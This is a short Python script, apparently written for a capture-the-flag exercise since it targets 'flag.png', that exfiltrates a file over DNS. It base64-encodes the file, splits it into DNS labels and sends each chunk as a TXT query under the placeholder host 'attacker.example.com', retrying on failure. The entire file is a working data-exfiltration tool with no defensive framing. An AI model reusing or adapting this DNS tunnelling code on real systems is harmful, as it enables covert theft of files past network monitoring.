import base64
import dns.resolver
import dns.query

ATTACKER_DOMAIN = "attacker.example.com"
DNS_SERVER = "8.8.8.8"
MAX_DNS_NAME_LENGTH = 255
MAX_LABEL_LENGTH = 63

def split_into_labels(data, label_size=MAX_LABEL_LENGTH):
    """Base64 데이터를 63 바이트 이하의 라벨로 나눔 -chatgpt"""
    return [data[i:i + label_size] for i in range(0, len(data), label_size)]

def truncate_to_max_length(labels, attacker_domain, index):
    base_length = len(attacker_domain) + len(str(index)) + 2  # ".index.attacker.example.com"
    current_length = base_length
    truncated_labels = []

    for label in labels:
        if current_length + len(label) + 1 > MAX_DNS_NAME_LENGTH:  # +1 for dot "."
            break
        truncated_labels.append(label)
        current_length += len(label) + 1

    # 초과된 데이터를 새로운 청크로 전달
    remaining_labels = labels[len(truncated_labels):]
    return truncated_labels, remaining_labels



def send_via_dns(data_chunks, attacker_domain, dns_server):
    resolver = dns.resolver.Resolver()
    resolver.nameservers = [dns_server]

    remaining_data = []
    for index, chunk in enumerate(data_chunks):
        labels = split_into_labels(chunk)
        valid_labels, overflow_labels = truncate_to_max_length(labels, attacker_domain, index)

        # 유효 라벨로 DNS 이름 생성
        subdomain = ".".join(valid_labels) + f".{index}.{attacker_domain}"
        print(f"[INFO] Sending chunk {index}: {subdomain}")

        retry_count = 3
        for attempt in range(retry_count):
            try:
                txt_query = dns.message.make_query(subdomain, dns.rdatatype.TXT)
                dns.query.udp(txt_query, dns_server)
                break
            except Exception as e:
                if attempt == retry_count - 1:
                    print(f"[ERROR] Failed to send chunk {index}: {e}")
                else:
                    print(f"[WARNING] Retrying chunk {index}: attempt {attempt + 1}")

        # 남은 데이터는 다음 청크로 추가
        if overflow_labels:
            remaining_data.append("".join(overflow_labels))

    # 남은 데이터를 추가 전송
    if remaining_data:
        send_via_dns(remaining_data, attacker_domain, dns_server)



def prepare_data(file_path, chunk_size=255):
    with open(file_path, "rb") as file:
        file_data = file.read()

    # Base64 인코딩 -chatgpt
    encoded_data = base64.b64encode(file_data).decode()
    print(f"[INFO] Encoded data size: {len(encoded_data)} bytes")

    # 데이터 청크 분할 -chatgpt
    chunks = [encoded_data[i:i + chunk_size] for i in range(0, len(encoded_data), chunk_size)]
    return chunks

if __name__ == "__main__":
    file_path = "flag.png"
    chunk_size = 255

    data_chunks = prepare_data(file_path, chunk_size)
    send_via_dns(data_chunks, ATTACKER_DOMAIN, DNS_SERVER)
